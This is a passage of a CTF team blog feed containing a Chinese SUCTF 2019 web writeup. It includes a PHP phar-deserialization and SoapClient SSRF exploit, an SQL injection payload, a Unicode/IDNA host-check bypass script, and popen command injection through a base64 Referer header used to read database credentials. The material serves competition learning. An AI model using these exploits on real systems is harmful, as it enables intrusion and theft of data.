class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        getFlag(<span class="keyword">$this</span>-&gt;ip, <span class="keyword">$this</span>-&gt;port);</span><br><span class="line">        <span class="comment">//使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        $ip = $_POST[<span class="string">'ip'</span>];     <span class="comment">//你用来获取flag的服务器ip</span></span><br><span class="line">        $port = $_POST[<span class="string">'port'</span>]; <span class="comment">//你用来获取flag的服务器端口</span></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过大致分析，需要点： ssrf、触发反序列化、上传内容不能有&lt;?、不能直接用phar等已见的协议触发。</p><p>这里正则绕过：<code>php://filter/resource=phar://phar.phar</code></p><p>ssrf: 因为可以实例化任何类，然而题目并没有给什么有用的，自然想到SoapClient</p>上传内容不能有<?绕过： 结合前面两题的trick`<script language="php">__HALT_COMPILER();<p>`</p><p>触发反序列化：<code>$this-&gt;type = finfo_file($finfo, $this-&gt;file_name);</code></p><p>那么这些点全部都有了，直接贴exp吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'test.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;script language="php"&gt;__HALT_COMPILER();&lt;/script&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file_name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $target = <span class="string">"http://127.0.0.1/admin.php"</span>;</span><br><span class="line">        $post_string = <span class="string">'admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3='</span>. <span class="string">"\r\n"</span>;</span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name  = [</span><br><span class="line">            <span class="keyword">null</span>,</span><br><span class="line">            <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                  <span class="string">'user_agent'</span>=&gt; str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, <span class="string">'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers).<span class="string">'Content-Length: '</span>. (string)strlen($post_string).<span class="string">'^^^^'</span>.$post_string),</span><br><span class="line">                  <span class="string">'uri'</span>=&gt;<span class="string">'hello'</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = <span class="keyword">new</span> File;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($object));</span><br><span class="line">$phar-&gt;setMetadata($object);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>把生成的test.phar改成test.jpg上传，然后访问<code>php://filter/resource=phar://upload/2bc454e1fc8129de63d3c034e5c0c24f/0412c29576c708cf0155e8de242169b1.jpg</code></p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819102450-85b206be-c228-1.png" alt><figcaption>image.png</figcaption></figure><h2><span id="easy_sql">easy_sql</span></h2><p>这道题下午队里师傅突然说扫到源码（传说中的运维事故，运维vim异常退出导致源码泄露，运维背锅，出题人已哭晕在厕所。），源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">    $post = <span class="keyword">array</span>();</span><br><span class="line">    $get = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">global</span> $MysqlLink;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//GetPara();</span></span><br><span class="line">    $MysqlLink = mysqli_connect(<span class="string">"localhost"</span>,$datauser,$datapass);</span><br><span class="line">    <span class="keyword">if</span>(!$MysqlLink)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Mysql Connect Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $selectDB = mysqli_select_db($MysqlLink,$dataName);</span><br><span class="line">    <span class="keyword">if</span>(!$selectDB)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Choose Database Error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($v)&amp;&amp;is_string($v))&#123;</span><br><span class="line">            $post[$k] = trim(addslashes($v));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//die();</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you <span class="keyword">if</span> the flag is right. &lt;/ a&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"query"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一看，感觉跟之前自己fuzz的没啥区别，唯一可喜的就是看到了执行的语句，直接上payload吧，拼接后为：<code>select *,2||flag from Flag</code>即可查出flag</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145357-1da6a8a6-c24e-1.png" alt><figcaption>20.png</figcaption></figure><h2><span id="pythonnginx">pythonnginx</span></h2><p>这题简单明了，直接是用<code>blackhat</code>议题之一<code>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization</code>，其中关于python的如下图，具体PPT链接如下：<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" title="PPT链接" target="_blank" rel="noopener">PPT链接</a>，我就不细说了 <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094905-86e3f344-c223-1.png" alt="image.png"></p><p>我们可以简单的写一个脚本来爆破一下最后一个字符串<code>c</code>，脚本如下 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">uni=chr(x)</span><br><span class="line">url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> getUrl(url):</span><br><span class="line">print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">get_unicode()</span><br></pre></td></tr></table></figure></p><p>结果如下，随便拿一个字符就行</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819094341-c5f6b31a-c222-1.png" alt><figcaption>image.png</figcaption></figure><p>根据题目提示<code>Dont worry about the suctf.cc. Go on!</code>猜测应该是hosts文件<code>suctf.cc</code>绑定了<code>127.0.0.1</code>，既然是<code>127.0.0.1</code>我们可以尝试用file协议读一下文件</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819095833-d9815172-c224-1.png" alt><figcaption>image.png</figcaption></figure><p>成功读取，那么现在就是找flag了，根据提示猜测flag位置可能和nginx有关，尝试读一下nginx的配置文件</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100036-22a88f0a-c225-1.png" alt="image.png"> 得到flag <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100100-31587ea2-c225-1.png" alt="image.png"></p><h2><span id="cocktails-remix">Cocktail's Remix</span></h2><p>这题是结合逆向的一道题，扫描一下发现有一个下载功能，可以读文件，但是试了一个常规的flag文件路径都读不到flag，猜测flag应该不在目录里面。还有一个<code>info.php</code>也没有发现什么信息，猜测与题目名字有关，info.php里面搜索一下 <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161703-b96e3776-c259-1.png" alt="image.png"></p><p>果真有点东西，把<code>mod_cocktail.so</code>文件下载下来，丢<code>IDA</code>看一下</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819161939-16c6acdc-c25a-1.png" alt><figcaption>image.png</figcaption></figure><p>大概意思是获取<code>Reffer</code>头的内容然后传入<code>j_remix</code>后的字符串拿去<code>popen</code>，跟进<code>j_remix</code>看一下，代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* remixedchar = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">num_strchr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="built_in">strchr</span>((<span class="keyword">char</span>*)str, c);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">    result = v2 - str;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remix</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *remixed, <span class="keyword">char</span> *dedata)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// si</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// er15</span></span><br><span class="line"></span><br><span class="line">  v2 = dedata;</span><br><span class="line">  v3 = *remixed;</span><br><span class="line">  <span class="keyword">if</span> ( *remixed )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = remixed + <span class="number">1</span>;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">4</span> * num_strchr(remixedchar, v3);</span><br><span class="line">        v9 = num_strchr(remixedchar, *v4);</span><br><span class="line">        v2[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5] = v8 | (v9 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v4[<span class="number">1</span>] != <span class="number">61</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 += <span class="number">4</span>;</span><br><span class="line">        v3 = *(v4 - <span class="number">1</span>);</span><br><span class="line">        v5 = v5 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !*(v4 - <span class="number">1</span>) )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">      &#125;</span><br><span class="line">      v6 = num_strchr(remixedchar, v4[<span class="number">1</span>]);</span><br><span class="line">      v2[(<span class="keyword">signed</span> <span class="keyword">int</span>)v5 + <span class="number">1</span>] = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xF</span> | <span class="number">16</span> * v9;</span><br><span class="line">      <span class="keyword">if</span> ( v4[<span class="number">2</span>] == <span class="number">61</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = v5 + <span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        j = v5 + <span class="number">2</span>;</span><br><span class="line">        v5 = v5 + <span class="number">3</span>;</span><br><span class="line">        v2[j] = num_strchr(remixedchar, v4[<span class="number">2</span>]) &amp; <span class="number">0x3F</span> | (v6 &lt;&lt; <span class="number">6</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v4 += <span class="number">4</span>;</span><br><span class="line">      v3 = *(v4 - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( *(v4 - <span class="number">1</span>) );</span><br><span class="line">LABEL_8:</span><br><span class="line">    v5 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  v2[v5] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问了一下队里面的re师傅，说这个是base64，尝试一下发现可以</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162510-dc15f934-c25a-1.png" alt><figcaption>image.png</figcaption></figure><p>但是发现都找不到flag，通过之前扫描出来的<code>config.php</code>，猜测flag应该在数据库里面，读一下config文件得到数据库用户密码</p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162734-31db9194-c25b-1.png" alt><figcaption>image.png</figcaption></figure><p><code>show databases</code>一下 <img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819162955-85c05ce0-c25b-1.png" alt="image.png"></p><p><code>use flag;show tables</code></p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163517-45b571e8-c25c-1.png" alt><figcaption>image.png</figcaption></figure><p><code>select * from flag.flag</code></p><figure><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819163559-5efc045a-c25c-1.png" alt><figcaption>image.png</figcaption></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;de1ta-team&quot;&gt;&lt;strong&gt;De1ta-Team&lt;/strong&gt;&lt;/h1&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://blog.de1ta.com/tags/ctf/"/>
    
      <category term="re" scheme="https://blog.de1ta.com/tags/re/"/>
    
      <category term="web" scheme="https://blog.de1ta.com/tags/web/"/>
    
      <category term="crypto" scheme="https://blog.de1ta.com/tags/crypto/"/>
    
      <category term="pwn" scheme="https://blog.de1ta.com/tags/pwn/"/>
    
      <category term="misc" scheme="https://blog.de1ta.com/tags/misc/"/>
    
      <category term="writeup" scheme="https://blog.de1ta.com/tags/writeup/"/>
    
      <category term="suctf" scheme="https://blog.de1ta.com/tags/suctf/"/>
    
  </entry>
  
  <entry>
    <title>De1ctf 2019 Writeup</title>
    <link href="https://blog.de1ta.com/2019/08/08/de1ctf2019%20Writeup/"/>
    <id>https://blog.de1ta.com/2019/08/08/de1ctf2019 Writeup/</id>
    <published>2019-08-08T04:56:14.000Z</published>
    <updated>2020-05-07T04:29:21.207Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="de1ta-team"><strong>De1ta-Team</strong></span></h1><a id="more"></a><blockquote><p>Team：De1ta</p></blockquote><h1><span id="source-exp-wp">source + exp + wp</span></h1><p><a href="https://github.com/De1ta-team/De1CTF2019" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019</a></p><!-- toc --><ul><li><a href="#crypto">crypto</a><ul><li><a href="#xorz">Xorz</a><ul><li><a href="#exp">exp</a></li></ul></li><li><a href="#baby-rsa">Baby RSA</a><ul><li><a href="#exp-1">exp</a></li></ul></li><li><a href="#babylfsr">Babylfsr</a><ul><li><a href="#exp-2">exp</a></li></ul></li><li><a href="#obscured">Obscured</a></li><li><a href="#mini-purε">Mini Purε</a></li></ul></li><li><a href="#pwn">pwn</a><ul><li><a href="#unprintable">Unprintable</a><ul><li><a href="#exp-3">exp</a></li></ul></li><li><a href="#race">Race</a><ul><li><a href="#一-竞态泄露slab地址">一、竞态泄露slab地址</a></li><li><a href="#二-分配大量内存占位physmap">二、分配大量内存，占位physmap</a></li><li><a href="#三-竞态写释放后的slab-object">三、竞态写释放后的slab object</a></li><li><a href="#四-查找physmap地址别名">四、查找physmap地址别名</a></li><li><a href="#五-tty_struct常规用法">五、tty_struct常规用法</a></li><li><a href="#exp-4">exp</a></li><li><a href="#reference">reference</a></li></ul></li><li><a href="#babyrust">babyRust</a></li><li><a href="#mimic_note">Mimic_note</a></li><li><a href="#weapon">weapon</a><ul><li><a href="#first">first</a></li><li><a href="#second">second</a></li></ul></li><li><a href="#ab-judge">A+B judge</a></li></ul></li><li><a href="#re">re</a><ul><li><a href="#re_sign">Re_Sign</a><ul><li><a href="#exp-5">exp</a></li><li><a href="#output">output</a></li></ul></li><li><a href="#cplusplus">Cplusplus</a><ul><li><a href="#分析">分析</a></li></ul></li><li><a href="#evil_boost">evil_boost</a><ul><li><a href="#分析-1">分析</a></li></ul></li><li><a href="#signal-vm-signal-vm-δ">Signal vm + Signal vm Δ</a><ul><li><a href="#流程">流程</a></li><li><a href="#指令">指令</a></li><li><a href="#算法">算法</a></li><li><a href="#源代码">源代码</a></li><li><a href="#总结">总结</a></li></ul></li></ul></li><li><a href="#web">web</a><ul><li><a href="#ssrf-me">SSRF Me</a><ul><li><a href="#预期解法">预期解法:</a></li><li><a href="#题解">题解:</a></li></ul></li><li><a href="#9calc">9calc</a><ul><li><a href="#part-1">Part 1</a></li><li><a href="#part-2">Part 2</a></li><li><a href="#part-3">Part 3</a></li><li><a 